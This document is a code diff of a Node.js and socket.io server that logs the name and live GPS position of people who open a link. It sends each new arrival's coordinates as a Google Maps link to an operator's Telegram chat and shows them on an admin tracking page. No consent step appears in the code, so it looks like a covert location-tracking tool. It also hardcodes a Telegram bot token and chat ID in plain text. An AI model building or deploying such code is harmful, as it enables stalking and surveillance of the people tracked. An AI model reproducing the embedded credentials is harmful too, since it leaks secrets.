@@ -15,36 +15,50 @@ app.use(express.static(path.join(__dirname, 'dist')));
 // 1. PERSISTENT STORAGE (In-Memory)
 let trackedUsers = {};
 
-// 2. TELEGRAM NOTIFICATION SETTINGS
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8675032884:AAHwrxfA52fcHK69LxDY3q9jem8Ky-aw4Hs';
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '6670686940';
-
 const sendTelegramAlert = async (name, lat, lng) => {
-  if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') return; // Skip if not set up
+  // Using your provided credentials
+  const token = process.env.TELEGRAM_BOT_TOKEN || '8675032884:AAHwrxfA52fcHK69LxDY3q9jem8Ky-aw4Hs';
+  const chatId = process.env.TELEGRAM_CHAT_ID || '6670686940';
   
-  // Fixed Google Maps URL here
-  const message = `🚨 *NEW CONNECTION* 🚨\n\n*${name}* just shared their location!\n\n📍 [Open in Google Maps](https://maps.google.com/maps?q=${lat},${lng})\n💻 Check your Admin Portal for live tracking.`;
-  
+  console.log("🚨 TELEGRAM ALERT TRIGGERED FOR:", name);
+  console.log("👉 Token Found in Render?", !!token);
+  console.log("👉 Chat ID Found in Render?", !!chatId);
+
+  if (!token || !chatId) {
+    console.log("❌ ABORTING: Render Environment Variables are missing!");
+    return;
+  }
+
+  // FIXED GOOGLE MAPS LINK: Properly formats the latitude and longitude
+  const mapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
+  const message = `🚨 *FROOZY ALERT* 🚨\n\n*${name}* is active!\n\n📍 [View on Google Maps](${mapsUrl})`;
+
   try {
-    // Note: This uses native fetch. Ensure you are running Node.js version 18 or above.
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    console.log("📡 Sending message to Telegram API...");
+    const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
+        chat_id: chatId,
         text: message,
         parse_mode: 'Markdown',
         disable_web_page_preview: false
       })
     });
+    
+    const data = await response.json();
+    if (data.ok) {
+      console.log("✅ TELEGRAM MESSAGE SENT SUCCESSFULLY!");
+    } else {
+      console.log("❌ TELEGRAM API REJECTED IT:", data.description);
+    }
   } catch (err) {
-    console.error("Failed to send Telegram alert", err);
+    console.error("❌ NODEJS FETCH ERROR:", err.message);
   }
 };
 
 io.on('connection', (socket) => {
   socket.on('update-location', (userData) => {
-    // Check if this is a brand new session or they are coming back online
     const isNewSession = !trackedUsers[userData.userId] || trackedUsers[userData.userId].status === 'offline';
     
     // Store/Update the user data
@@ -54,12 +68,11 @@ io.on('connection', (socket) => {
       status: 'online' // Mark as active
     };
 
-    // If they just opened the link, send the alert to your Telegram
+    // If they just opened the link, send the alert to your phone
     if (isNewSession) {
       sendTelegramAlert(userData.name, userData.lat, userData.lng);
     }
 
-    // Broadcast the updated state to the admin
     io.emit('users-list', Object.values(trackedUsers));
   });
 });
@@ -70,7 +83,6 @@ setInterval(() => {
   let stateChanged = false;
   
   Object.keys(trackedUsers).forEach(id => {
-    // If they haven't sent a location update in 2 minutes, mark them offline
     if (trackedUsers[id].status === 'online' && (now - trackedUsers[id].lastSeen > 120000)) {
       trackedUsers[id].status = 'offline'; // Keep the data, just mark offline
       stateChanged = true;
@@ -82,7 +94,7 @@ setInterval(() => {
   }
 }, 10000);
 
-// Catch-all for React Router to handle direct visits to /admin
+// Catch-all for React Router
 app.get('*', (req, res) => {
   res.sendFile(path.join(__dirname, 'dist', 'index.html'));
 });
